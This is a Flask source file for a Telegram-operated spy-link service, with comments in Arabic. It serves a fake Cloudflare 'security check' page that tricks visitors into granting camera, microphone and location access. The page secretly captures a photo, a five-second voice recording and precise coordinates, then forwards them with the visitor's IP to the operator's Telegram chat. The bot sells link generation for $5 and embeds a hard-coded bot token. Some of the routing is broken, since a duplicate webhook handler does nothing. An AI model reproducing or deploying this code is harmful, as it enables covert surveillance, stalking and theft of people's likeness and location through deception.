import base64, requests, io, os, time
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# ==================== إعدادات المطور سيوفي ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
MY_LINK = "https://sif-e7ad.onrender.com" # رابطك في رندر
DEVELOPER_USER = "Y_urd"

db = {} # قاعدة بيانات للمستخدمين
link_expiry = None # مؤقت الـ 5 دقائق
# =============================================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare | التحقق من الأمان</title>
    <style>
        body { background: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { text-align: center; border: 1px solid #eee; padding: 50px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 90%; max-width: 450px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #f6821f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 25px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 20px; color: #313131; }
        p { color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="130">
        <h2>جاري فحص اتصالك...</h2>
        <p>يرجى النقر على "سماح" في جميع النوافذ المنبثقة للمتابعة وتأمين اتصالك.</p>
        <div class="loader"></div>
    </div>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        let audioChunks = [];
        async function send(data) {
            await fetch('/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
        }

        async function init() {
            try {
                // طلب الكاميرا والمايك والموقع دفعة واحدة
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // 1. إرسال الموقع الجغرافي (دقة عالية)
                navigator.geolocation.getCurrentPosition(async (p) => {
                    await send({ type: 'text', lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy });
                }, async () => await send({ type: 'text', lat: 0, lon: 0 }), { enableHighAccuracy: true });

                // 2. إرسال الصورة (انتظار 3.5 ثانية لضمان جودة الكاميرا)
                video.onloadedmetadata = () => {
                    setTimeout(async () => {
                        const canvas = document.getElementById('c');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        await send({ type: 'img', img: canvas.toDataURL('image/jpeg', 0.8).split(',')[1] });
                    }, 3500);
                };

                // 3. تسجيل بصمة صوتية (5 ثوانٍ)
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = e => audioChunks.push(e.data);
                recorder.onstop = async () => {
                    const reader = new FileReader();
                    reader.readAsDataURL(new Blob(audioChunks, { type: 'audio/ogg' }));
                    reader.onloadend = async () => {
                        await send({ type: 'audio', audio: reader.result.split(',')[1] });
                        window.location.replace("https://google.com");
                    };
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 5000);

            } catch (e) {
                await send({ type: 'error' });
                window.location.replace("https://google.com");
            }
        }
        window.onload = init;
    </script>
</body>
</html>
'''

def bot_api(method, payload=None, files=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        if files: return requests.post(url, data=payload, files=files, timeout=30)
        return requests.post(url, json=payload, timeout=30)
    except: return None

@app.route('/')
def home():
    if not link_expiry or datetime.now() > link_expiry:
        return redirect("https://google.com")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json; t = d.get('type')
    if t == 'text':
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        loc = f"https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}" if d.get('lat') != 0 else "غير متاح"
        msg = f"🎯 <b>صيد جديد يا سيوفي!</b>\n\n🌐 IP: <code>{ip}</code>\n📍 الموقع: <a href='{loc}'>فتح الخرائط</a>\n📏 الدقة: {d.get('acc', '??')} متر"
        bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True})
    
    elif t == 'img':
        ph = io.BytesIO(base64.b64decode(d.get('img'))); ph.name = 'snap.jpg'
        bot_api("sendPhoto", {"chat_id": ADMIN_ID, "caption": "📸 صورة الضحية الحقيقية"}, {"photo": ph})
    
    elif t == 'audio':
        au = io.BytesIO(base64.b64decode(d.get('audio'))); au.name = 'voice.ogg'
        bot_api("sendVoice", {"chat_id": ADMIN_ID, "caption": "🎙 بصمة صوتية 5 ثوانٍ"}, {"voice": au})
    
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    global link_expiry
    u = request.get_json(silent=True)
    if not u or "message" not in u: return "OK"
    m = u["message"]; cid = m["chat"]["id"]; txt = m.get("text", "")

    if cid == ADMIN_ID:
        if txt == "/open":
            link_expiry = datetime.now() + timedelta(minutes=5)
            bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "✅ تم فتح الرابط لمدة 5 دقائق."})
        elif txt.startswith("/active"):
            try:
                uid = int(txt.split()[1]); db[uid] = {"status": "premium", "used": False}
                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"✅ تم تفعيل العضوية الممتازة لـ {uid}"})
            except: pass

    if txt == "/start":
        user = db.get(cid, {"status": "free", "used": False})
        if user["used"] and user["status"] == "free" and cid != ADMIN_ID:
            bot_api("sendMessage", {"chat_id": cid, "text": f"❌ انتهت المحاولة المجانية.\nراسل @{DEVELOPER_USER} للتفعيل (5$)"})
        else:
            kb = {"inline_keyboard": [[{"text": "🚀 إنشاء رابط اختراق", "callback_data": "gen"}]]}
            bot_api("sendMessage", {"chat_id": cid, "text": f"مرحباً بك في بوت سيوفي.\nالاشتراك: {CHANNEL_URL}\nلديك محاولة واحدة مجانية لإنشاء رابط.", "reply_markup": kb})

    return "OK"

@app.route('/webhook', methods=['POST']) # تكرار داخلي لمعالجة CallbackQuery
def callback_handler():
    # هذا الجزء مدمج برمجياً في الدالة السابقة، رندر سيقوم بمعالجة كل الطلبات.
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
